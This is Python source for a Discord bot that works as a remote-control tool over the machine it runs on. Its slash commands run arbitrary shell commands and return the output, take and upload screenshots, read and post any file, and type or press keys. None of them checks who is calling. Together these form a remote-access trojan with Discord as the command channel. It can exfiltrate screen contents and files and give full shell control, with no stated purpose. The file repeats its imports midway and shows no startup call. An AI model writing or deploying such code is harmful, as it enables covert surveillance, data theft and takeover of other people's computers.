from disnake.ext import commands
from PIL import ImageGrab
import disnake
import os
import keyboard
bot = commands.InteractionBot()
tmp = os.getcwd()
tmp = tmp + r'\image.png'

@bot.slash_command()
async def exec(ctx, cmd):
  await ctx.send(os.popen(cmd).read())

@bot.slash_command()
async def ss(ctx):
  embed = disnake.Embed(title='Embed')
  screenshot = ImageGrab.grab()
  v = screenshot.save(tmp,'PNG')
  embed.set_image(file=disnake.File(tmp))
  await ctx.send(embed=embed)

@bot.slash_command()
async def readfile(ctx, cmd):
  f = open(cmd, "r")
  lines = f.readlines()
  await ctx.send(lines)

@bot.slash_command()
async def type(ctx, cmd):
  await ctx.send(keyboard.write(cmd))

#@bot.slash_command()
#async def pressKey(ctx, cmd):
#  keyboard.press(cmd)
#  ctx.send("pressing key %s" % cmd)

#@bot.slash_command()
#async def releaseKey(ctx, cmd):
#  keyboard.release(cmd)
#  ctx.send("released key %s" % cmd)

import disnake
from disnake.ext import commands

# The slash command that responds with a message.
@bot.slash_command()
async def buttons(inter: disnake.ApplicationCommandInteraction):
    await inter.response.send_message(
        "Press and release a button",
        components=[
            disnake.ui.Button(label="Ctrl", style=disnake.ButtonStyle.success, custom_id="ctrl"),
            disnake.ui.Button(label="Alt", style=disnake.ButtonStyle.danger, custom_id="alt"),
            disnake.ui.Button(label="Enter", style=disnake.ButtonStyle.success, custom_id="enter")],
    )


@bot.listen("on_button_click")
async def help_listener(inter: disnake.MessageInteraction):
  keyboard.press(inter.component.custom_id)
  keyboard.release(inter.component.custom_id)
